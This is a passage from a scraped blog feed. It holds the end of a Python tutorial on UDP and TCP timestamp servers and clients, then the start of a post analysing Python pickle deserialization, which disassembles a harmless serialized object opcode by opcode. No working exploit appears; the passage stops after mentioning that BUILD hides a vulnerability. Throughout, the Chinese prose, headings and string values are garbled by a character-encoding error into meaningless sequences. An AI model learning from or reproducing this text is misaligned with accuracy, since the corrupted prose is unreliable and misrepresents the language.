href="#UDPæ—¶é—´æˆ³æœåŠ¡å™¨" class="headerlink" title="UDPæ—¶é—´æˆ³æœåŠ¡å™¨"></a>UDPæ—¶é—´æˆ³æœåŠ¡å™¨</h3><p>æœåŠ¡å™¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>udpSerSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_DGRAM<span class="token punctuation">)</span>udpSerSock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Waiting for message..."</span><span class="token punctuation">)</span>    data<span class="token punctuation">,</span> addr <span class="token operator">=</span> udpSerSock<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>    udpSerSock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>addr<span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...received from and returned to :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>udpSerSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å®¢æˆ·ç«¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>HOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span>udpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_DGRAM<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>        <span class="token keyword">break</span>    udpCliSock<span class="token punctuation">.</span>sendto<span class="token punctuation">(</span>data<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>ADDR<span class="token punctuation">)</span>    data<span class="token punctuation">,</span> ADDR <span class="token operator">=</span> udpCliSock<span class="token punctuation">.</span>recvfrom<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span>    <span class="token keyword">break</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>udpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408162549689.png" alt loading="lazy"></p><h3 id="scoketserveræ¨¡å—"><a href="#scoketserveræ¨¡å—" class="headerlink" title="scoketserveræ¨¡å—"></a>scoketserveræ¨¡å—</h3><p><code>socketserver</code>æ˜¯æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªé«˜çº§åˆ«çš„æ¨¡å—ã€‚ç”¨äºç®€åŒ–å®ç°ç½‘ç»œå®¢æˆ·ç«¯ä¸æœåŠ¡å™¨æ‰€éœ€è¦çš„å¤§é‡æ ·æ¿ä»£ç ã€‚æ¨¡å—ä¸­å·²ç»å®ç°äº†ä¸€äº›å¯ä»¥ä½¿ç”¨çš„ç±»</p><table><thead><tr><th align="center">ç±»</th><th align="center">æè¿°</th></tr></thead><tbody><tr><td align="center">BaseServer</td><td align="center">åŒ…å«æ ¸å¿ƒæœåŠ¡å™¨åŠŸèƒ½å’Œmix-inçš„é’©å­ï¼Œä»…ç”¨äºæ¨å¯¼ï¼Œä¸åˆ›å»ºç±»çš„å®ä¾‹</td></tr><tr><td align="center">TCPServer/UDPServer</td><td align="center">åŸºç¡€çš„ç½‘ç»œåŒæ­¥TCP/UDPæœåŠ¡å™¨</td></tr><tr><td align="center">UnixStreamServer/UnixDatagramServer</td><td align="center">åŸºäºæ–‡ä»¶çš„åŸºç¡€åŒæ­¥TCP/UDPæœåŠ¡å™¨</td></tr><tr><td align="center">BaseRequestHandler</td><td align="center">åŒ…å«å¤„ç†æœåŠ¡å™¨è¯·æ±‚çš„æ ¸å¿ƒåŠŸèƒ½ï¼Œä»…ç”¨äºæ¨å¯¼ï¼Œä¸åˆ›å»ºç±»çš„å®ä¾‹</td></tr><tr><td align="center">StreamRequestHandler/DatagramRequestHandler</td><td align="center">å®ç°TCP/UDPæœåŠ¡å™¨çš„æœåŠ¡å¤„ç†å™¨</td></tr></tbody></table><h3 id="scoketserver-TCP-æœåŠ¡å™¨"><a href="#scoketserver-TCP-æœåŠ¡å™¨" class="headerlink" title="scoketserver TCP æœåŠ¡å™¨"></a>scoketserver TCP æœåŠ¡å™¨</h3><p>æœåŠ¡å™¨</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socketserver <span class="token keyword">import</span> <span class="token punctuation">(</span>TCPServer <span class="token keyword">as</span> TCP<span class="token punctuation">,</span> StreamRequestHandler <span class="token keyword">as</span> SRH<span class="token punctuation">)</span><span class="token keyword">from</span> time <span class="token keyword">import</span> ctimeHOST <span class="token operator">=</span> <span class="token string">"0.0.0.0"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">MyRequestHandler</span><span class="token punctuation">(</span>SRH<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">handle</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"...conneceted from :&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>client_address<span class="token punctuation">)</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>wfile<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"[&#123;&#125;] &#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>self<span class="token punctuation">.</span>rfile<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tcpServ <span class="token operator">=</span> TCP<span class="token punctuation">(</span>ADDR<span class="token punctuation">,</span>MyRequestHandler<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"waiting for connection..."</span><span class="token punctuation">)</span>tcpServ<span class="token punctuation">.</span>serve_forever<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>å®¢æˆ·ç«¯</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> socket <span class="token keyword">import</span> <span class="token operator">*</span>HOST <span class="token operator">=</span> <span class="token string">"192.168.0.102"</span>PORT <span class="token operator">=</span> <span class="token number">22222</span>BUFSIZ <span class="token operator">=</span> <span class="token number">1024</span>ADDR <span class="token operator">=</span> <span class="token punctuation">(</span>HOST<span class="token punctuation">,</span>PORT<span class="token punctuation">)</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>tcpCliSock <span class="token operator">=</span> socket<span class="token punctuation">(</span>AF_INET<span class="token punctuation">,</span>SOCK_STREAM<span class="token punctuation">)</span>tcpCliSock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>ADDR<span class="token punctuation">)</span>data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'> '</span><span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span><span class="token keyword">break</span>tcpCliSock<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">"&#123;&#125;\r\n"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>data <span class="token operator">=</span> tcpCliSock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>BUFSIZ<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token keyword">not</span> data<span class="token punctuation">:</span><span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>data<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>tcpCliSock<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p>æ•ˆæœå¦‚ä¸‹</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/image-20200408171411501.png" alt loading="lazy"></p>]]></content>
      
      
      <categories>
          
          <category> å¤‡å¿˜å½• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pythonååºåˆ—åŒ–æ¼æ´æµ…æ</title>
      <link href="posts/488d0f65/"/>
      <url>posts/488d0f65/</url>
      
        <content type="html"><![CDATA[<h3 id="pickleåº“"><a href="#pickleåº“" class="headerlink" title="pickleåº“"></a>pickleåº“</h3><p>è¯´åˆ°pythonååºåˆ—åŒ–å°±å½“ç„¶ç¦»ä¸å¼€<code>pickle</code>åº“</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405204254190.png" alt loading="lazy"></p><p>ä»¥ä¸Šä¾‹å­ç®€å•çš„ç¤ºèŒƒäº†pythonè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æ“ä½œ</p><span id="more"></span><h3 id="pickletoolsåº“"><a href="#pickletoolsåº“" class="headerlink" title="pickletoolsåº“"></a>pickletoolsåº“</h3><p>ä¸ºäº†èƒ½å¤Ÿæ›´æ·±å±‚çš„ç†è§£pythonååºåˆ—åŒ–çš„è¿‡ç¨‹ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°ä¸€ä¸ªpythonè‡ªå¸¦çš„pickleè°ƒè¯•å™¨<code>pickletools</code>åº“ï¼Œè¿™ä¸ªåº“æœ‰ä¸‰ä¸ªåŠŸèƒ½ï¼š</p><ul><li>åæ±‡ç¼–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²   <code>pickletools.dis</code></li><li>ä¼˜åŒ–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²       <code>pickletools.optimize</code></li><li>è¿”å›ä¸€ä¸ªè¿­ä»£å™¨æ¥ä¾›ç¨‹åºä½¿ç”¨       <code>pickletools.genops</code></li></ul><p>ä¸€èˆ¬æˆ‘ä»¬ä½¿ç”¨å‰ä¸¤ä¸ªåŠŸèƒ½ï¼Œå¯ä»¥å…ˆçœ‹ä¸€ä¸‹æ•ˆæœï¼š</p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Pythonååºåˆ—åŒ–æ¼æ´æµ…æ/image-20200405205451074.png" style="zoom:80%;" loading="lazy"><p>è¿™å°±æ˜¯åæ±‡ç¼–çš„åŠŸèƒ½ï¼Œè§£æé‚£ä¸ªå­—ç¬¦ä¸²ï¼Œç„¶åå‘Šè¯‰ä½ è¿™ä¸ªå­—ç¬¦ä¸²å¹²äº†ä»€ä¹ˆï¼Œæ¯ä¸€è¡Œéƒ½æ˜¯ä¸€æ¡æŒ‡ä»¤</p><p>åºåˆ—åŒ–ç»“æ„ç¤ºæ„å›¾ï¼ˆè½¬ï¼‰</p><p><img src="https://gitee.com/Extrader/blogimage/raw/master/image/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%B5%85%E6%9E%90/image-20200405211802380.png" alt loading="lazy"></p><p>æ ˆæ˜¯ååºåˆ—åŒ–æœ€æ ¸å¿ƒçš„æ•°æ®ç»“æ„ï¼Œæ‰€æœ‰çš„æ•°æ®æ“ä½œå‡ ä¹éƒ½åœ¨æ ˆä¸Šã€‚ä¸ºäº†åº”å¯¹æ•°æ®åµŒå¥—ï¼Œæ ˆåŒºåˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†ï¼šå½“å‰æ ˆä¸“æ³¨äºç»´æŠ¤æœ€é¡¶å±‚çš„ä¿¡æ¯ï¼Œå‰åºæ ˆä¿å­˜äº†ç¨‹åºè¿è¡Œè‡³ä»Šçš„ï¼ˆä¸åœ¨é¡¶å±‚çš„ï¼‰å®Œæ•´çš„æ ˆä¿¡æ¯ã€‚</p><p>å­˜å‚¨åŒºå¯ä»¥ç±»æ¯”å†…å­˜ï¼Œç”¨äºå­˜å–å˜é‡ã€‚å®ƒæ˜¯ä¸€ä¸ªæ•°ç»„ï¼Œä»¥ä¸‹æ ‡ä¸ºç´¢å¼•ã€‚å®ƒçš„æ¯ä¸€ä¸ªå•å…ƒå¯ä»¥ç”¨æ¥å­˜å‚¨ä»»ä½•ä¸œè¥¿ã€‚</p><p>ä¸‹é¢æˆ‘ä»¬è¯•å›¾æ¥åºåˆ—åŒ–ä¸€ä¸ªç±»</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> pickle<span class="token keyword">import</span> pickletools<span class="token keyword">class</span> <span class="token class-name">dairy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>date <span class="token operator">=</span> <span class="token number">20202020</span>        self<span class="token punctuation">.</span>text <span class="token operator">=</span> <span class="token string">'è¯­è¨€'</span>        self<span class="token punctuation">.</span>tode <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'è®¡'</span><span class="token punctuation">,</span><span class="token string">'ç®—'</span><span class="token punctuation">,</span><span class="token string">'æœº'</span><span class="token punctuation">]</span>        today <span class="token operator">=</span> dairy<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span><span class="token punctuation">)</span>x <span class="token operator">=</span> pickle<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>today<span class="token punctuation">)</span>x <span class="token operator">=</span> pickletools<span class="token punctuation">.</span>optimize<span class="token punctuation">(</span>x<span class="token punctuation">)</span>   <span class="token comment">#ä¼˜åŒ–ï¼Œæ¶ˆé™¤æœªä½¿ç”¨çš„PUT</span>pickletools<span class="token punctuation">.</span>dis<span class="token punctuation">(</span>x<span class="token punctuation">)</span>     <span class="token comment">#åæ±‡ç¼–ä¸€ä¸ªå·²ç»æ‰“åŒ…çš„å­—ç¬¦ä¸²ï¼Œä¼˜åŒ–ä¸€ä¸ªå·²ç»è¢«æ‰“åŒ…çš„å­—ç¬¦ä¸²</span></code></pre><p><code>pickle</code>æ„é€ å‡ºçš„å­—ç¬¦ä¸²æœ‰å¾ˆå¤šä¸ªç‰ˆæœ¬ï¼Œåœ¨<code>pickle.loads</code>æ—¶å¯ä»¥ç”¨<code>protocol</code>å‚æ•°æŒ‡å®šåè®®çš„ç‰ˆæœ¬ï¼Œç›®å‰è¿™äº›åè®®æœ‰0,1,2,3,4å·ç‰ˆæœ¬ï¼Œé»˜è®¤ä½¿ç”¨çš„æ˜¯3å·ç‰ˆæœ¬ï¼Œpickleåè®®ç‰ˆæœ¬å‘å‰å…¼å®¹ï¼Œæ‰€ä»¥ä¸ç”¨æ‹…å¿ƒ0å·ç‰ˆæœ¬çš„å­—ç¬¦ä¸²äº¤ç»™<code>pickle.loads</code>åä¼šå‘ç”Ÿä»€ä¹ˆæ„å¤–</p><ul><li><strong>v0</strong> ç‰ˆåè®®æ˜¯åŸå§‹çš„ â€œäººç±»å¯è¯»â€ åè®®ï¼Œå¹¶ä¸”å‘åå…¼å®¹æ—©æœŸç‰ˆæœ¬çš„ Pythonã€‚</li><li><strong>v1</strong> ç‰ˆåè®®æ˜¯è¾ƒæ—©çš„äºŒè¿›åˆ¶æ ¼å¼ï¼Œå®ƒä¹Ÿä¸æ—©æœŸç‰ˆæœ¬çš„ Python å…¼å®¹ã€‚</li><li><strong>v2</strong> ç‰ˆåè®®æ˜¯åœ¨ Python 2.3 ä¸­å¼•å…¥çš„ã€‚å®ƒä¸ºå­˜å‚¨ new-style class æä¾›äº†æ›´é«˜æ•ˆçš„æœºåˆ¶ã€‚æ¬²äº†è§£æœ‰å…³ç¬¬ 2 ç‰ˆåè®®å¸¦æ¥çš„æ”¹è¿›ï¼Œè¯·å‚é˜… PEP 307ã€‚</li><li><strong>v3</strong> ç‰ˆåè®®æ·»åŠ äº Python 3.0ã€‚å®ƒå…·æœ‰å¯¹ bytes å¯¹è±¡çš„æ˜¾å¼æ”¯æŒï¼Œä¸”æ— æ³•è¢« Python 2.x æ‰“å¼€ã€‚è¿™æ˜¯ç›®å‰é»˜è®¤ä½¿ç”¨çš„åè®®ï¼Œä¹Ÿæ˜¯åœ¨è¦æ±‚ä¸å…¶ä»– Python 3 ç‰ˆæœ¬å…¼å®¹æ—¶çš„æ¨èåè®®ã€‚</li><li><strong>v4</strong> ç‰ˆåè®®æ·»åŠ äº Python 3.4ã€‚å®ƒæ”¯æŒå­˜å‚¨éå¸¸å¤§çš„å¯¹è±¡ï¼Œèƒ½å­˜å‚¨æ›´å¤šç§ç±»çš„å¯¹è±¡ï¼Œè¿˜åŒ…æ‹¬ä¸€äº›é’ˆå¯¹æ•°æ®æ ¼å¼çš„ä¼˜åŒ–ã€‚æœ‰å…³ç¬¬ 4 ç‰ˆåè®®å¸¦æ¥æ”¹è¿›çš„ä¿¡æ¯ï¼Œè¯·å‚é˜… PEP 3154ã€‚</li></ul><p>ä»¥ä¸Šä»£ç é™¤äº†å°†åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²åæ±‡ç¼–åè¿˜ç”¨<code>pickletools</code>çš„<code>optimize</code>æ–¹æ³•æ¥å°†åæ±‡ç¼–åçš„ä»£ç è¿›è¡Œäº†ä¼˜åŒ–ï¼Œä¼˜åŒ–åè¾“å‡ºçš„ç»“æœå¦‚ä¸‹ï¼š</p><pre class="language-shell" data-language="shell"><code class="language-shell">b<span class="token string">'\x80\x03c__main__\ndairy\nq\x00)\x81q\x01&#125;q\x02(X\x04\x00\x00\x00dateq\x03J$B4\x01X\x04\x00\x00\x00textq\x04X\x06\x00\x00\x00\xe8\xaf\xad\xe8\xa8\x80q\x05X\x04\x00\x00\x00todeq\x06]q\x07(X\x03\x00\x00\x00\xe8\xae\xa1q\x08X\x03\x00\x00\x00\xe7\xae\x97q\tX\x03\x00\x00\x00\xe6\x9c\xbaq\neub.'</span>        <span class="token number">0</span>: <span class="token punctuation">\</span>x80 PROTO      <span class="token number">3</span>    <span class="token number">2</span>: c    GLOBAL     <span class="token string">'__main__ dairy'</span>   <span class="token number">18</span>: <span class="token punctuation">)</span>    EMPTY_TUPLE   <span class="token number">19</span>: <span class="token punctuation">\</span>x81 NEWOBJ   <span class="token number">20</span>: <span class="token punctuation">&#125;</span>    EMPTY_DICT   <span class="token number">21</span>: <span class="token punctuation">(</span>    MARK   <span class="token number">22</span>: X        BINUNICODE <span class="token string">'date'</span>   <span class="token number">31</span>: J        BININT     <span class="token number">20202020</span>   <span class="token number">36</span>: X        BINUNICODE <span class="token string">'text'</span>   <span class="token number">45</span>: X        BINUNICODE <span class="token string">'è¯­è¨€'</span>   <span class="token number">56</span>: X        BINUNICODE <span class="token string">'tode'</span>   <span class="token number">65</span>: <span class="token punctuation">]</span>        EMPTY_LIST   <span class="token number">66</span>: <span class="token punctuation">(</span>        MARK   <span class="token number">67</span>: X            BINUNICODE <span class="token string">'è®¡'</span>   <span class="token number">75</span>: X            BINUNICODE <span class="token string">'ç®—'</span>   <span class="token number">83</span>: X            BINUNICODE <span class="token string">'æœº'</span>   <span class="token number">91</span>: e            APPENDS    <span class="token punctuation">(</span>MARK at <span class="token number">66</span><span class="token punctuation">)</span>   <span class="token number">92</span>: u        SETITEMS   <span class="token punctuation">(</span>MARK at <span class="token number">21</span><span class="token punctuation">)</span>   <span class="token number">93</span>: b    BUILD   <span class="token number">94</span>: <span class="token builtin class-name">.</span>    STOPhighest protocol among opcodes <span class="token operator">=</span> <span class="token number">2</span></code></pre><p>å…¶ä¸­å› ä¸ºä½¿ç”¨äº†<code>optimize</code>æ–¹æ³•çœç•¥äº†<code>q  BINPUT   x</code>è¿™ä¸€è¡Œæ±‡ç¼–æŒ‡ä»¤ï¼Œè¿™è¡ŒæŒ‡ä»¤çš„æ„æ€æ˜¯æŠŠå½“å‰æ ˆçš„æ ˆé¡¶å¤åˆ¶ä¸€ä»½ï¼Œæ”¾è¿›å­˜å‚¨åŒºï¼Œ</p><p>ä¸‹é¢å¯¹ä¼˜åŒ–åçš„ä»£ç ä¸€è¡Œä¸€è¡Œçš„è¿›è¡Œè§£é‡Š</p><pre class="language-none"><code class="language-none">0: \x80 PROTO      3</code></pre><p><code>\x80</code>ï¼šç‰ˆæœ¬(<code>protocol</code>)2ååŠ å…¥ï¼Œæœºå™¨çœ‹åˆ°è¿™ä¸ªæ“ä½œç¬¦ï¼Œç«‹åˆ»å†å»å­—ç¬¦ä¸²è¯»å–ä¸€ä¸ªå­—èŠ‚ï¼Œå¾—åˆ°x03ã€‚ä»£è¡¨è¿™ä¸ªæ˜¯ä¾æ®3å·åè®®åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œéšåè¿™ä¸ªæ“ä½œç»“æŸã€‚</p><pre class="language-none"><code class="language-none">2: c    GLOBAL     &#39;__main__ dairy&#39;</code></pre><p><code>c</code>æ“ä½œç¬¦ï¼šè¿ç»­è¯»å–ä¸¤ä¸ªå­—ç¬¦ä¸²<code>module</code>å’Œ<code>name</code>ï¼Œè§„å®šä»¥<code>\n</code>ä¸ºåˆ†å‰²ç»™<code>find_class</code>æ–¹æ³•ï¼Œç„¶åæŠŠ<code>module.name</code>å‹å…¥æ ˆï¼Œç°åœ¨è¯»å–åˆ°çš„æ˜¯<code>main.dairy</code>ï¼Œæ”¾å…¥æ ˆä¸­ï¼Œé€šå¸¸ç”¨æ¥è·å–ä¸€ä¸ªæ¨¡å—ä¸­çš„å±æ€§</p><pre class="language-none"><code class="language-none">18: )    EMPTY_TUPLE</code></pre><p><code>)</code>æ“ä½œç¬¦ï¼šæŠŠä¸€ä¸ªç©ºçš„<code>tuple</code>å‹å…¥å½“å‰æ ˆ</p><pre class="language-none"><code class="language-none">19: \x81 NEWOBJ</code></pre><p><code>\x81</code>æ“ä½œç¬¦ï¼šä»æ ˆä¸­å…ˆå¼¹å‡ºä¸€ä¸ªå…ƒç´ ï¼Œè®°ä¸º<code>args</code>ï¼Œå†å¼¹å‡ºä¸€ä¸ªå…ƒç´ è®°ä¸º<code>cls</code>ï¼Œæ¥ä¸‹æ¥æ‰§è¡Œ<code>cls.new(cls,*args)</code>ï¼Œç„¶åæŠŠå¾—åˆ°çš„ä¸œè¥¿å‹å…¥æ ˆï¼Œç®€å•æ¥è¯´ï¼Œä»æ ˆä¸­å¼¹å‡ºä¸€ä¸ªå‚æ•°å’Œä¸€ä¸ª<code>class</code>ï¼Œç„¶ååˆ©ç”¨è¿™ä¸ªå‚æ•°å®ä¾‹åŒ–<code>class</code>ï¼ŒæŠŠå¾—åˆ°çš„å®ä¾‹å‹å…¥æ ˆ </p><pre class="language-none"><code class="language-none">20: &#125;    EMPTY_DICT</code></pre><p><code>&#125;</code>æ“ä½œç¬¦ï¼šæŠŠä¸€ä¸ªç©ºçš„<code>dict</code>å‹è¿›æ ˆ</p><pre class="language-none"><code class="language-none">21: (    MARK</code></pre><p>MARKæ“ä½œç¬¦ï¼šè¿™ä¸ªæ“ä½œç¬¦å¹²çš„äº‹ç§°ä¸º<code>load_mark</code>ï¼ŒæŠŠå½“å‰æ ˆè¿™ä¸ªæ•´ä½“ï¼Œä½œä¸ºä¸€ä¸ª<code>list</code>ï¼Œå‹è¿›å‰åºæ ˆï¼ŒæŠŠå½“å‰æ ˆæ¸…ç©º</p><pre class="language-none"><code class="language-none">22: X        BINUNICODE &#39;date&#39;</code></pre><p><code>X</code>æ“ä½œç¬¦ï¼šå’ŒVæ“ä½œç¬¦ä¸€æ ·æ˜¯è¯»å…¥å­—ç¬¦ä¸²å‹å…¥å †æ ˆï¼Œåé¢è·Ÿçš„å››ä¸ªå­—èŠ‚ä»£è¡¨å­—ç¬¦ä¸²é•¿åº¦ï¼Œå¦‚ï¼š<code>X\x04\x00\x00\x00date</code></p><pre class="language-none"><code class="language-none">31: J        BININT     20202020</code></pre><p>Jæ“ä½œç¬¦ï¼šå’ŒXå’ŒVä¸€æ ·ï¼Œåªä¸è¿‡è¿™ä¸ªæ˜¯4å­—èŠ‚å‘çš„intå‹ï¼ˆä¸ªäººç†è§£ï¼‰</p><pre class="language-none"><code class="language-none">65: ]        EMPTY_LIST</code></pre><p><code>]</code>æ“ä½œç¬¦ï¼ŒæŠŠä¸€ä¸ªç©ºçš„<code>list</code>å‹è¿›æ ˆ</p><pre class="language-none"><code class="language-none">91: e            APPENDS    (MARK at 66)</code></pre><p>MARKç»“æŸï¼Œé€šè¿‡æœ€ä¸Šé¢çš„ï¼ˆ66è¡Œï¼‰å †æ ˆç‰‡æ‰©å±•å †æ ˆä¸Šçš„åˆ—è¡¨ï¼Œç®€å•æ¥è¯´å°±æ˜¯å½¢æˆä¸€ä¸ªåˆ—è¡¨ï¼ˆä¸ªäººç†è§£ï¼‰</p><pre class="language-none"><code class="language-none">92: u        SETITEMS   (MARK at 21)</code></pre><p>è°ƒç”¨<code>pop_mark</code>ï¼ŒæŠŠå½“å‰æ ˆçš„å†…å®¹æ‰”è¿›ä¸€ä¸ªæ•°ç»„<code>arr</code>ï¼Œç„¶åæŠŠå½“å‰æ ˆæ¢å¤åˆ°MARKæ—¶çš„çŠ¶æ€ï¼Œä»27è¡Œå¼€å§‹åŒºåˆ†é”®å€¼å¯¹ï¼Œä¸¤ä¸ªä¸€ç»„åœ°è¯»<code>arr</code>é‡Œé¢çš„å…ƒç´ ï¼Œå‰è€…ä½œä¸ºkeyï¼Œåè€…ä½œä¸ºvalue</p><pre class="language-none"><code class="language-none">93: b    BUILD</code></pre><p>æŠŠå½“å‰æ ˆæ ˆé¡¶å­˜è¿›<code>state</code>ï¼Œç„¶åå¼¹æ‰ï¼ŒæŠŠå½“å‰æ ˆé¡¶è®°ä¸º<code>inst</code>ï¼Œç„¶åå¼¹æ‰ï¼Œåˆ©ç”¨<code>state</code>è¿™ç³»åˆ—çš„å€¼æ¥æ›´æ–°å®ä¾‹<code>inst</code>ï¼ŒæŠŠå¾—åˆ°çš„å¯¹è±¡æ‰”åˆ°å½“å‰æ ˆï¼Œå¦‚æœ<code>inst</code>æ‹¥æœ‰<code>__setstate__</code>æ–¹æ³•ï¼Œåˆ™å§<code>state</code>äº¤ç»™<code>__setstate__</code>æ–¹æ³•æ¥å¤„ç†ï¼Œå¦åˆ™çš„è¯ï¼Œç›´æ¥æŠŠ<code>state</code>è¿™ä¸ª<code>dist</code>çš„å†…å®¹ï¼Œåˆå¹¶åˆ°<code>inst.__dict__</code> é‡Œé¢ã€‚å®é™…ä¸Šè¿™é‡Œå°±æœ‰ä¸€ä¸ªå®‰å…¨æ¼æ´</p><pre class="language-none"><code class="language-none">94: .    